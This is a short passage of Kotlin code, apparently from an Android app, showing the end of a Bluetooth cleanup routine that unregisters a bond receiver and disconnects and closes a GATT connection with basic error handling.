            } catch (e: Exception) {
                // Ignore
            }
        }
        bondReceiver = null

        currentGatt?.let { gatt ->
            try {
                gatt.disconnect()
                gatt.close()
            } catch (e: Exception) {
                Log.e(TAG, "Error during cleanup", e)
            }
        }
        currentGatt = null
    }
}
